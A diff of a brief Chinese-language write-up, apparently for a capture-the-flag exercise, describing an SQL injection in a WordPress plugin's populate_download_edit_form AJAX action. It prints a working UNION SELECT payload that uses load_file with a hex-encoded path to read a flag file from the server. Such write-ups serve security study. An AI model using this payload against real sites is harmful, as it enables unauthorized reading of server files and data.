@@ -169,5 +169,8 @@ public function populate_download_edit_form() {
 这里的$_POST[ ‘id’ ]没有经过过滤直接带入了sql语句，造成了sql注入。
 注册登录，POST发送如下数据包：
 ```
-/wp-admin/admin-ajax.php?action=populate_download_edit_form id=0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)
+/wp-admin/admin-ajax.php?action=populate_download_edit_form 
+
+data:
+id=0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)
 ```
